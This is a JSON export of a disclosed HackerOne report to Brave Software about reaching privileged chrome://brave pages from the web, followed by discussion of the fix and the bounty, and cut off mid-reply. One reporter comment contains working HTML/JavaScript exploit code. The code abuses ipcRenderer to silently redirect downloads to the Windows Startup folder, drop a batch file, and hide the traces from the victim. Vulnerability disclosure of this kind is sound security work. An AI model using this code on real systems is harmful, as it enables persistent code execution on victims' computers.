{"id":415967,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTU5Njc=","url":"https://hackerone.com/reports/415967","title":"chrome://brave navigation from web","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-09-28T22:10:33.055Z","submitted_at":"2018-09-28T22:10:33.055Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"qab","url":"/qab","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15688,"url":"https://hackerone.com/brave","handle":"brave","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Brave Software","twitter_handle":"brave","website":"https://brave.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-10-23T19:13:25.251Z","bug_reporter_agreed_on_going_public_at":"2018-10-11T18:03:12.283Z","team_member_agreed_on_going_public_at":"2018-10-23T19:13:25.175Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\n\nIt's possible to navigate to the infamous 'chrome://brave' (and all other) privileged page from web, requiring only a single click. This is possible by opening popups with the 'noopener' attribute.\n\n## Products affected: \n\n \nBrave: 0.24.0 \nV8: 6.9.427.23 \nrev: f657f15bf7e0e0c50a2b854c6b05edb59bfc556c \nMuon: 8.1.6 \nOS Release: 10.0.17134 \nUpdate Channel: Release \nOS Architecture: x64 \nOS Platform: Microsoft Windows \nNode.js: 7.9.0 \nBrave Sync: v1.4.2 \nlibchromiumcontent: 69.0.3497.100\n\n## Steps To Reproduce:\n\n1. Host attached PoC from web\n2. Click button\n\n## Impact\n\nThis is a direct violation of SOP, we can open any URL of which chrome://brave is the worst as it could lead to RCE.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eIt\u0026#39;s possible to navigate to the infamous \u0026#39;chrome://brave\u0026#39; (and all other) privileged page from web, requiring only a single click. This is possible by opening popups with the \u0026#39;noopener\u0026#39; attribute.\u003c/p\u003e\n\n\u003ch2 id=\"products-affected\"\u003eProducts affected:\u003c/h2\u003e\n\n\u003cp\u003eBrave: 0.24.0 \u003cbr\u003e\nV8: 6.9.427.23 \u003cbr\u003e\nrev: f657f15bf7e0e0c50a2b854c6b05edb59bfc556c \u003cbr\u003e\nMuon: 8.1.6 \u003cbr\u003e\nOS Release: 10.0.17134 \u003cbr\u003e\nUpdate Channel: Release \u003cbr\u003e\nOS Architecture: x64 \u003cbr\u003e\nOS Platform: Microsoft Windows \u003cbr\u003e\nNode.js: 7.9.0 \u003cbr\u003e\nBrave Sync: v1.4.2 \u003cbr\u003e\nlibchromiumcontent: 69.0.3497.100\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eHost attached PoC from web\u003c/li\u003e\n\u003cli\u003eClick button\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis is a direct violation of SOP, we can open any URL of which chrome://brave is the worst as it could lead to RCE.\u003c/p\u003e\n","bounty_amount":"650.0","formatted_bounty":"$650","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":352562,"file_name":"anchor.html","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/562/f0cef1d46ed463af230e9e6dea27f840c9c7dd2f/anchor.html?response-content-disposition=attachment%3B%20filename%3D%22anchor.html%22%3B%20filename%2A%3DUTF-8%27%27anchor.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRAVCXZTG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055437Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCDC1SbghdXLcy9ot06DANg74r5EiCC3XZ9CQGAdi%2BmbgIhALBQDzrYaszHyI6V41WOAEV%2Fa%2FxVgBgdKj18DrlZlW1RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgxgXaQ5tEaz15kO93YqkQPMn8lqJM5b%2F2UF4vgQzRZODqw%2FjPEjzpD61mE7LpyVCQKuiixef4EDRyTs5YaVZ%2BSeI6BYbm829Q00SoHZnAn9tGULy0VEKf9Lyq8uAs7eAOStN9gpb9p9GsQ2vxpwHzC%2F%2FjQuXDX8lTd6eIkj3L4VFhPdt4MGf%2FwzTbeirX69pmEGa7VpqUl%2BzQFSRmiyNkLz0iIRuGyUxcUtEFnAa4dcYImN8d5Xmzj3VKwszN5CZZekG0f6wVgiDQt2PU05Sm4mXV8F7Zsd2gCjxy0LByxZo8wVIQRR7XpJjeAXw7Y%2BrcntwG4VG16O2JBB13PV47avtAluDB7xEmxCn7fC%2B0gCkgtqX5FvemeTqZkzDj%2BNAE87%2BEwY1GKygDSgK%2BDrUlCwwYU%2FB1k9vGEpOa46oz6dP6MWDopeRWpW%2Fh2qwIShnMsIk%2BmfjH9n%2FnOGNwWwQp93Hlr6OPw%2F8tYLstkLZrNH3jzkkWMoWcsrv71HzpJiG6RZtm22uXPNaQTbmOYqMX%2BCryjdGcVIctKAsj5EliP0zjCb4Kr%2FBTrqAW3ufL%2FR%2FpkxPRO%2BUhyyvDPzgPmCSraR2g7lBy3KlX6LZ3JukP4SRvLInSvSu0w4T7VQh0EVNyALDb1flUgqzAKwYanyEiiHqHeCF6g4fX5%2Fuz8knjUQsnKmjOQfBtyaMe0qlW%2BHWCfwsR%2Fh2SNKi%2BVT7%2FCT2Ct%2Fia0RQuGDOtTr7KGlRg89Qz6oCZtR4isqOEM5yt6saYHHNTOAelO07weXRwFwKuKqmrZYMA5sa9p7XKqJAwmjMWMyFxAcEDHOluiNcMsa9JfilicFsycW11kxP5ZdIbUgRRdK1IdlTu3Ykx5X3L1RmsfWjw%3D%3D\u0026X-Amz-Signature=29ec62c76ad58adfd582084eebd92c05fa2f5d504caa6fcd752099cdc7a8d411","file_size":168,"type":"text/html"}],"allow_singular_disclosure_at":null,"vote_count":21,"voters":["spam404","sameerphad72","metnew","mygf","eveeez","xiaoyinl","an0nym0us","kunal94","whitesector","japz","and 11 more..."],"severity":{"rating":"critical","author_type":"Team"},"structured_scope":{"databaseId":7933,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/brave/browser-laptop","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3404826,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Alright so I came up with a pretty good new PoC. \n\nI am chaining the bugs I found, first is the local file detection for fuzzing OS username so we can predict our dropped html file ( https://hackerone.com/reports/415167 ) and the Windows RCE chrome code described in ( https://hackerone.com/reports/415178 ).\n\nI am dropping an HTML file by having the user hold down 'enter' and then suddenly pop a 'saveas' download prompt, then i immediately open the chrome:brave location (since keyboard keys count as a valid user gesture worthy of a popup) and then boom, RCE from web!\n\nSTR: (Windows only)\n\n1. Host attached PoC on web\n2. Wait for it to guess your OS username (I put a smallish list of names, please just put yours somewhere in the array if its not in it)\n3. Once its done, hold down 'enter'\n\n\n\n","markdown_message":"\u003cp\u003eAlright so I came up with a pretty good new PoC. \u003c/p\u003e\n\n\u003cp\u003eI am chaining the bugs I found, first is the local file detection for fuzzing OS username so we can predict our dropped html file ( \u003ca title=\"https://hackerone.com/reports/415167\" href=\"https://hackerone.com/reports/415167\"\u003ehttps://hackerone.com/reports/415167\u003c/a\u003e ) and the Windows RCE chrome code described in ( \u003ca title=\"https://hackerone.com/reports/415178\" href=\"https://hackerone.com/reports/415178\"\u003ehttps://hackerone.com/reports/415178\u003c/a\u003e ).\u003c/p\u003e\n\n\u003cp\u003eI am dropping an HTML file by having the user hold down \u0026#39;enter\u0026#39; and then suddenly pop a \u0026#39;saveas\u0026#39; download prompt, then i immediately open the chrome:brave location (since keyboard keys count as a valid user gesture worthy of a popup) and then boom, RCE from web!\u003c/p\u003e\n\n\u003cp\u003eSTR: (Windows only)\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eHost attached PoC on web\u003c/li\u003e\n\u003cli\u003eWait for it to guess your OS username (I put a smallish list of names, please just put yours somewhere in the array if its not in it)\u003c/li\u003e\n\u003cli\u003eOnce its done, hold down \u0026#39;enter\u0026#39;\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2018-09-29T00:42:36.503Z","updated_at":"2018-09-29T00:42:36.503Z","actor":{"username":"qab","cleared":true,"url":"/qab","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":352619,"filename":"bravity.html","type":"text/html","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/619/1af08ff10cc2fdaad07578db80b53f4488c84e40/bravity.html?response-content-disposition=attachment%3B%20filename%3D%22bravity.html%22%3B%20filename%2A%3DUTF-8%27%27bravity.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRAVCXZTG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055437Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCDC1SbghdXLcy9ot06DANg74r5EiCC3XZ9CQGAdi%2BmbgIhALBQDzrYaszHyI6V41WOAEV%2Fa%2FxVgBgdKj18DrlZlW1RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgxgXaQ5tEaz15kO93YqkQPMn8lqJM5b%2F2UF4vgQzRZODqw%2FjPEjzpD61mE7LpyVCQKuiixef4EDRyTs5YaVZ%2BSeI6BYbm829Q00SoHZnAn9tGULy0VEKf9Lyq8uAs7eAOStN9gpb9p9GsQ2vxpwHzC%2F%2FjQuXDX8lTd6eIkj3L4VFhPdt4MGf%2FwzTbeirX69pmEGa7VpqUl%2BzQFSRmiyNkLz0iIRuGyUxcUtEFnAa4dcYImN8d5Xmzj3VKwszN5CZZekG0f6wVgiDQt2PU05Sm4mXV8F7Zsd2gCjxy0LByxZo8wVIQRR7XpJjeAXw7Y%2BrcntwG4VG16O2JBB13PV47avtAluDB7xEmxCn7fC%2B0gCkgtqX5FvemeTqZkzDj%2BNAE87%2BEwY1GKygDSgK%2BDrUlCwwYU%2FB1k9vGEpOa46oz6dP6MWDopeRWpW%2Fh2qwIShnMsIk%2BmfjH9n%2FnOGNwWwQp93Hlr6OPw%2F8tYLstkLZrNH3jzkkWMoWcsrv71HzpJiG6RZtm22uXPNaQTbmOYqMX%2BCryjdGcVIctKAsj5EliP0zjCb4Kr%2FBTrqAW3ufL%2FR%2FpkxPRO%2BUhyyvDPzgPmCSraR2g7lBy3KlX6LZ3JukP4SRvLInSvSu0w4T7VQh0EVNyALDb1flUgqzAKwYanyEiiHqHeCF6g4fX5%2Fuz8knjUQsnKmjOQfBtyaMe0qlW%2BHWCfwsR%2Fh2SNKi%2BVT7%2FCT2Ct%2Fia0RQuGDOtTr7KGlRg89Qz6oCZtR4isqOEM5yt6saYHHNTOAelO07weXRwFwKuKqmrZYMA5sa9p7XKqJAwmjMWMyFxAcEDHOluiNcMsa9JfilicFsycW11kxP5ZdIbUgRRdK1IdlTu3Ykx5X3L1RmsfWjw%3D%3D\u0026X-Amz-Signature=dca50ee01059c96a25fca00ee49e46671fb1a592813f3eab732d008e3ef94409"},{"id":352618,"filename":"braveRCE.mkv","type":"video/x-matroska","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/618/5dc8106b332ff7b9a3ad5b8088ee6c8d41e8796c/braveRCE.mkv?response-content-disposition=attachment%3B%20filename%3D%22braveRCE.mkv%22%3B%20filename%2A%3DUTF-8%27%27braveRCE.mkv\u0026response-content-type=video%2Fx-matroska\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRAVCXZTG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055437Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCDC1SbghdXLcy9ot06DANg74r5EiCC3XZ9CQGAdi%2BmbgIhALBQDzrYaszHyI6V41WOAEV%2Fa%2FxVgBgdKj18DrlZlW1RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgxgXaQ5tEaz15kO93YqkQPMn8lqJM5b%2F2UF4vgQzRZODqw%2FjPEjzpD61mE7LpyVCQKuiixef4EDRyTs5YaVZ%2BSeI6BYbm829Q00SoHZnAn9tGULy0VEKf9Lyq8uAs7eAOStN9gpb9p9GsQ2vxpwHzC%2F%2FjQuXDX8lTd6eIkj3L4VFhPdt4MGf%2FwzTbeirX69pmEGa7VpqUl%2BzQFSRmiyNkLz0iIRuGyUxcUtEFnAa4dcYImN8d5Xmzj3VKwszN5CZZekG0f6wVgiDQt2PU05Sm4mXV8F7Zsd2gCjxy0LByxZo8wVIQRR7XpJjeAXw7Y%2BrcntwG4VG16O2JBB13PV47avtAluDB7xEmxCn7fC%2B0gCkgtqX5FvemeTqZkzDj%2BNAE87%2BEwY1GKygDSgK%2BDrUlCwwYU%2FB1k9vGEpOa46oz6dP6MWDopeRWpW%2Fh2qwIShnMsIk%2BmfjH9n%2FnOGNwWwQp93Hlr6OPw%2F8tYLstkLZrNH3jzkkWMoWcsrv71HzpJiG6RZtm22uXPNaQTbmOYqMX%2BCryjdGcVIctKAsj5EliP0zjCb4Kr%2FBTrqAW3ufL%2FR%2FpkxPRO%2BUhyyvDPzgPmCSraR2g7lBy3KlX6LZ3JukP4SRvLInSvSu0w4T7VQh0EVNyALDb1flUgqzAKwYanyEiiHqHeCF6g4fX5%2Fuz8knjUQsnKmjOQfBtyaMe0qlW%2BHWCfwsR%2Fh2SNKi%2BVT7%2FCT2Ct%2Fia0RQuGDOtTr7KGlRg89Qz6oCZtR4isqOEM5yt6saYHHNTOAelO07weXRwFwKuKqmrZYMA5sa9p7XKqJAwmjMWMyFxAcEDHOluiNcMsa9JfilicFsycW11kxP5ZdIbUgRRdK1IdlTu3Ykx5X3L1RmsfWjw%3D%3D\u0026X-Amz-Signature=0092df1b802feeafff39f6fe5f615aee6490ca3600099d5073372858ee5c765e"}],"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3415030,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-01T18:40:19.951Z","updated_at":"2018-10-01T18:40:19.951Z","additional_data":{"old_severity":"Critical","new_severity":"High","old_severity_id":216501,"new_severity_id":217555},"actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3415050,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-01T18:43:44.011Z","updated_at":"2018-10-01T18:43:44.011Z","additional_data":{"old_severity":"High","new_severity":"Critical","old_severity_id":217555,"new_severity_id":217557},"actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3415053,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Merged into https://github.com/brave/browser-laptop/issues/15237\n\n@qab  i believe we have removed all the easy RCE vectors available in chrome://brave as of  https://github.com/brave/muon/commit/487188c3e0777feefe2c8a23dfc559f887873083. however you can still do pretty bad stuff with IPC renderer / clipboard / etc.","markdown_message":"\u003cp\u003eMerged into \u003ca title=\"https://github.com/brave/browser-laptop/issues/15237\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbrave%2Fbrowser-laptop%2Fissues%2F15237\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/brave/browser-laptop/issues/15237\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/qab\"\u003e@qab\u003c/a\u003e  i believe we have removed all the easy RCE vectors available in chrome://brave as of  \u003ca title=\"https://github.com/brave/muon/commit/487188c3e0777feefe2c8a23dfc559f887873083\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbrave%2Fmuon%2Fcommit%2F487188c3e0777feefe2c8a23dfc559f887873083\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/brave/muon/commit/487188c3e0777feefe2c8a23dfc559f887873083\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. however you can still do pretty bad stuff with IPC renderer / clipboard / etc.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-01T18:44:10.060Z","updated_at":"2018-10-01T18:44:10.060Z","actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3422334,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We can still perform RCE after that patch, using IPC:\n1. We disable the 'saveAs' prompt for downloads\n2. Using a path traversal bug(?) we set the default downloads to the startup folder\n3. Initiate download of an executable that will be dropped to the startup folder\n4. Clear all completed downloads\n5. Reset downloads path to the default 'Downloads' folder and return the 'saveAs' prompt, to makes things look normal as not to alert victim.\n\nWhen the user restarts, the executable is automatically executed. Interestingly, windows ignores Mark of the web when executing from startup folder on startup.\n\nThe following is the code which can be used in the RCE exploit instead (@line 48, change the base64 into the based64 of the code below)\n```\u003ca href=\"data:,calc\" download=\"q.bat\" id=\"qfile\"\u003e\u003c/a\u003e\n\u003cscript\u003e\nchrome.ipcRenderer.send(\"dispatch-action\",'{\"actionType\":\"app-change-setting\",\"key\":\"general.download-always-ask\",\"value\":false}');\nchrome.ipcRenderer.send(\"dispatch-action\",'{\"actionType\":\"app-change-setting\",\"key\":\"general.download-default-path\",\"value\":\"./../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup\"}');\nqfile.click()\nsetTimeout(`chrome.ipcRenderer.send(\"dispatch-action\",'{\"actionType\":\"app-clear-completed-downloads\"}');`,333);\nsetTimeout(`chrome.ipcRenderer.send(\"dispatch-action\",'{\"actionType\":\"app-change-setting\",\"key\":\"general.download-default-path\",\"value\":\"./../../../../Downloads/\"}');`,666);\nsetTimeout(`chrome.ipcRenderer.send(\"dispatch-action\",'{\"actionType\":\"app-change-setting\",\"key\":\"general.download-always-ask\",\"value\":true}');`,999);\n\u003c/script\u003e```","markdown_message":"\u003cp\u003eWe can still perform RCE after that patch, using IPC:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eWe disable the \u0026#39;saveAs\u0026#39; prompt for downloads\u003c/li\u003e\n\u003cli\u003eUsing a path traversal bug(?) we set the default downloads to the startup folder\u003c/li\u003e\n\u003cli\u003eInitiate download of an executable that will be dropped to the startup folder\u003c/li\u003e\n\u003cli\u003eClear all completed downloads\u003c/li\u003e\n\u003cli\u003eReset downloads path to the default \u0026#39;Downloads\u0026#39; folder and return the \u0026#39;saveAs\u0026#39; prompt, to makes things look normal as not to alert victim.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eWhen the user restarts, the executable is automatically executed. Interestingly, windows ignores Mark of the web when executing from startup folder on startup.\u003c/p\u003e\n\n\u003cp\u003eThe following is the code which can be used in the RCE exploit instead (@line 48, change the base64 into the based64 of the code below)\u003cbr\u003e\n\u003ccode\u003e\u0026lt;a href=\u0026quot;data:,calc\u0026quot; download=\u0026quot;q.bat\u0026quot; id=\u0026quot;qfile\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;\u003cbr\u003e\n\u0026lt;script\u0026gt;\u003cbr\u003e\nchrome.ipcRenderer.send(\u0026quot;dispatch-action\u0026quot;,\u0026#39;{\u0026quot;actionType\u0026quot;:\u0026quot;app-change-setting\u0026quot;,\u0026quot;key\u0026quot;:\u0026quot;general.download-always-ask\u0026quot;,\u0026quot;value\u0026quot;:false}\u0026#39;);\u003cbr\u003e\nchrome.ipcRenderer.send(\u0026quot;dispatch-action\u0026quot;,\u0026#39;{\u0026quot;actionType\u0026quot;:\u0026quot;app-change-setting\u0026quot;,\u0026quot;key\u0026quot;:\u0026quot;general.download-default-path\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;./../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup\u0026quot;}\u0026#39;);\u003cbr\u003e\nqfile.click()\u003cbr\u003e\nsetTimeout(`chrome.ipcRenderer.send(\u0026quot;dispatch-action\u0026quot;,\u0026#39;{\u0026quot;actionType\u0026quot;:\u0026quot;app-clear-completed-downloads\u0026quot;}\u0026#39;);`,333);\u003cbr\u003e\nsetTimeout(`chrome.ipcRenderer.send(\u0026quot;dispatch-action\u0026quot;,\u0026#39;{\u0026quot;actionType\u0026quot;:\u0026quot;app-change-setting\u0026quot;,\u0026quot;key\u0026quot;:\u0026quot;general.download-default-path\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;./../../../../Downloads/\u0026quot;}\u0026#39;);`,666);\u003cbr\u003e\nsetTimeout(`chrome.ipcRenderer.send(\u0026quot;dispatch-action\u0026quot;,\u0026#39;{\u0026quot;actionType\u0026quot;:\u0026quot;app-change-setting\u0026quot;,\u0026quot;key\u0026quot;:\u0026quot;general.download-always-ask\u0026quot;,\u0026quot;value\u0026quot;:true}\u0026#39;);`,999);\u003cbr\u003e\n\u0026lt;/script\u0026gt;\u003c/code\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-02T18:42:18.771Z","updated_at":"2018-10-02T18:42:18.771Z","actor":{"username":"qab","cleared":true,"url":"/qab","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3431791,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"this is on the border between high and critical since it requires some user interaction (holding down enter) and knowing or guessing the OS username, but definitely more serious than the other recent chrome://brave bugs since it only requires one click after the user has downloaded the attacker file.","markdown_message":"\u003cp\u003ethis is on the border between high and critical since it requires some user interaction (holding down enter) and knowing or guessing the OS username, but definitely more serious than the other recent chrome://brave bugs since it only requires one click after the user has downloaded the attacker file.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-04T00:30:52.365Z","updated_at":"2018-10-04T00:30:52.365Z","actor":{"url":"/brave","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Brave Software"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"brave","collaborator":{"username":"qab","url":"/qab"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3432432,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This seems too low to me compared to other reports, I hope I can get a clarification in my points below @brave. \n \nThe report at ( https://hackerone.com/reports/395737 ) awarded $1,000 for an attack relying on MITM. And as I understand, MITM requires physical proximity to a victim or having the victim use a specific proxy all of which are much unlikely scenarios than guessing a single name and holding down enter.\n$750 was awarded as a bonus for pointing out that there is a system html file that can be used to trigger reflected XSS, assuming this file is not under the control of Brave then its not fixed by you. So this file can still be found and used in conjuncture with my bug found here to result in the same flow of exploit. I have found some such HTML files on windows but they do not come by default pre-built with windows.\n\nin bug #375329, $400 was awarded for a local file reading bug that required the user to download and open an html file locally. Now, I can change the exploit here to do exactly that. All you have to do is download my PoC and open it locally and then I can execute chrome code after the user clicks anywhere or presses any keyboard button. So the difference of $100 between reading local files and RCE seems a bit too low for practically the same STR.\n\nFinally, I would like to leave you with this relevant video: https://www.youtube.com/watch?v=meiU6TxysCg","markdown_message":"\u003cp\u003eThis seems too low to me compared to other reports, I hope I can get a clarification in my points below \u003ca href=\"/brave\"\u003e@brave\u003c/a\u003e. \u003c/p\u003e\n\n\u003cp\u003eThe report at ( \u003ca title=\"https://hackerone.com/reports/395737\" href=\"https://hackerone.com/reports/395737\"\u003ehttps://hackerone.com/reports/395737\u003c/a\u003e ) awarded $1,000 for an attack relying on MITM. And as I understand, MITM requires physical proximity to a victim or having the victim use a specific proxy all of which are much unlikely scenarios than guessing a single name and holding down enter.\u003cbr\u003e\n$750 was awarded as a bonus for pointing out that there is a system html file that can be used to trigger reflected XSS, assuming this file is not under the control of Brave then its not fixed by you. So this file can still be found and used in conjuncture with my bug found here to result in the same flow of exploit. I have found some such HTML files on windows but they do not come by default pre-built with windows.\u003c/p\u003e\n\n\u003cp\u003ein bug \u003ca href=\"/reports/375329\"\u003e#375329\u003c/a\u003e, $400 was awarded for a local file reading bug that required the user to download and open an html file locally. Now, I can change the exploit here to do exactly that. All you have to do is download my PoC and open it locally and then I can execute chrome code after the user clicks anywhere or presses any keyboard button. So the difference of $100 between reading local files and RCE seems a bit too low for practically the same STR.\u003c/p\u003e\n\n\u003cp\u003eFinally, I would like to leave you with this relevant video: \u003ca title=\"https://www.youtube.com/watch?v=meiU6TxysCg\" href=\"/redirect?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DmeiU6TxysCg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.youtube.com/watch?v=meiU6TxysCg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-04T07:36:13.977Z","updated_at":"2018-10-04T07:36:13.977Z","actor":{"username":"qab","cleared":true,"url":"/qab","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3435615,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\"$750 was awarded as a bonus for pointing out that there is a system html file that can be used to trigger reflected XSS, assuming this file is not under the control of Brave then its not fixed by you.\" \u003c that's not actually why we gave the 750 bonus. We realized in light of other recent reports that we had severely underpaid (250) for an exploit that was RCE from the web with very little user interaction. The system HTML file issue he pointed out didn't have an impact on this decision.\n\nYou have a good point that this is similar in complexity to #375329 but has more impact.","markdown_message":"\u003cp\u003e\u0026quot;$750 was awarded as a bonus for pointing out that there is a system html file that can be used to trigger reflected XSS, assuming this file is not under the control of Brave then its not fixed by you.\u0026quot; \u0026lt; that\u0026#39;s not actually why we gave the 750 bonus. We realized in light of other recent reports that we had severely underpaid (250) for an exploit that was RCE from the web with very little user interaction. The system HTML file issue he pointed out didn\u0026#39;t have an impact on this decision.\u003c/p\u003e\n\n\u003cp\u003eYou have a good point that this is similar in complexity to \u003ca href=\"/reports/375329\"\u003e#375329\u003c/a\u003e but has more 